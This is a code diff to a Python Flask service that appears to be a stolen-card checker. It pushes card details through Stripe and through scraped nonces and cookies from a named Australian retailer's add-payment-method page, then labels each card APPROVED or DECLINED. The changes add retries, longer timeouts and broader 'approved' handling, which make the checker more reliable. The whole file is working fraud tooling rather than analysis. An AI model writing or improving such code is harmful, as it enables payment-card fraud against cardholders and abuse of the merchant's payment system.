@@ -4,6 +4,8 @@ import uuid
 import time
 from fake_useragent import UserAgent
 from flask import Flask, request, jsonify
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 app = Flask(__name__)
 
@@ -70,11 +72,16 @@ def process_card(ccx):
     }
 
     try:
-        pm_response = requests.post(
+        # Set up session with retries for Stripe API
+        session = requests.Session()
+        retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
+        session.mount('https://', HTTPAdapter(max_retries=retries))
+        
+        pm_response = session.post(
             'https://api.stripe.com/v1/payment_methods',
             data=payment_data,
             headers=stripe_headers,
-            timeout=10
+            timeout=15  # Increased timeout
         )
         pm_data = pm_response.json()
 
@@ -100,18 +107,24 @@ def process_card(ccx):
     }
 
     try:
-        nonce_response = requests.get(
+        # Set up session with retries for nonce retrieval
+        session = requests.Session()
+        session.mount('https://', HTTPAdapter(max_retries=retries))
+        
+        nonce_response = session.get(
             'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
             headers=headers,
             cookies=cookies,
-            timeout=10
+            timeout=15  # Increased timeout
         )
 
         if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
             nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
         else:
-            return {"response": "Failed to extract nonce", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
-    except Exception as e:
+            return {"response": "Failed to extract nonce: Nonce not found in page", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+    except requests.exceptions.ConnectTimeout:
+        return {"response": "Nonce Retrieval Failed: Connection to buildersdiscountwarehouse.com.au timed out", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+    except requests.exceptions.RequestException as e:
         return {"response": f"Nonce Retrieval Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
 
     # Step 3: Create and confirm setup intent
@@ -134,21 +147,19 @@ def process_card(ccx):
     }
 
     try:
-        setup_response = requests.post(
+        setup_response = session.post(
             'https://buildersdiscountwarehouse.com.au/',
             params=params,
             headers=headers,
             cookies=cookies,
             data=data,
-            timeout=10
+            timeout=15  # Increased timeout
         )
         setup_data = setup_response.json()
 
         if setup_data.get('success', False):
             data_status = setup_data['data'].get('status')
-            if data_status == 'requires_action':
-                return {"response": "Thank You! for your donation", "status": "APPROVED", "gateway": "Stripe Square [0.20$]"}
-            elif data_status == 'succeeded':
+            if data_status in ['requires_action', 'succeeded']:
                 return {"response": "Thank You! for your donation", "status": "APPROVED", "gateway": "Stripe Square [0.20$]"}
             elif 'error' in setup_data['data']:
                 error_msg = setup_data['data']['error'].get('message', 'Unknown error')
@@ -160,7 +171,7 @@ def process_card(ccx):
 
         return {"response": "Unknown response from gateway", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
 
-    except Exception as e:
+    except requests.exceptions.RequestException as e:
         return {"response": f"Setup Intent Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
 
 # Flask route to handle card processing
